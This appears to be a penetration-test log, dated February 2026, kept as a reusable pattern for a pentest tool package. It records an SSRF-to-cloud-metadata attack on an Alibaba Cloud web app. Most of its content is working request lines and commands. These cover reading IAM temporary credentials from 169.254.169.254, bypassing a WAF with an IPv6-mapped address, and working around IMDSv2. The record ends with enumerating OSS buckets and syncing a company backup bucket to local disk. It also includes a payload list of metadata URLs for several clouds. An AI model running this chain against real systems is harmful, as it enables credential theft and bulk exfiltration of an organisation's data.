# [2026-02] SSRF → Cloud metadata → AK/SK → OSS full data

## Scene classification
Web Penetration/Cloud Security

## Goal overview
Access the cloud metadata service through the SSRF vulnerability of the web application, obtain temporary credentials, and finally export all data in the OSS bucket.

## Complete execution link

1. Found that SSRF exists in the image proxy interface
   ```
GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (Intranet port detection successful)
   ```
2. Trying to access cloud metadata
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → Return to metadata directory list
   ```
3. Get IAM role name
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. Get temporary credentials
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. Enumerate OSS buckets using credentials
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # or aliyun oss ls
   ```
6. Discover sensitive buckets and export data
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## Trampling on pit records

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| SSRF intercepted by WAF 169.254 | IP blacklist | Bypassed with IPv6 address `[::ffff:169.254.169.254]` | 15min |
| Temporary credentials expire in 1 hour | STS Token has a short validity period | Write a script to automatically refresh the Token | 10min |
| Metadata v2 requires Token | IMDSv2 protection | First PUT to obtain Token, then request with Token | 20min |

## Toolchain discovery
- Alibaba Cloud and AWS have different metadata paths, so you need to try them separately.
- IMDSv2 requires a two-step request (PUT to obtain token → GET with token)
- Some cloud vendors have enabled IMDSv2 by default, making SSRF more difficult.

## Key code/command

```bash
# IMDSv2 bypass (requires SSRF to support custom Method and Header)
# Step 1: Get Token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Request with Token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## Reusable patterns/script snippets

```bash
# SSRF cloud metadata quick detection payload list
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## Suggestions for improvements to this package
- routing.md already has SSRF/cloud secure routing ✓
- It is recommended to supplement the metadata path comparison table of each cloud vendor in pentest-tools/references

## evolution action
- [ ] Supplement cloud metadata path comparison table to references

## environmental information
- Target: Alibaba Cloud ECS + OSS
- Web framework: Spring Boot 2.7
- SSRF type: Full SSRF
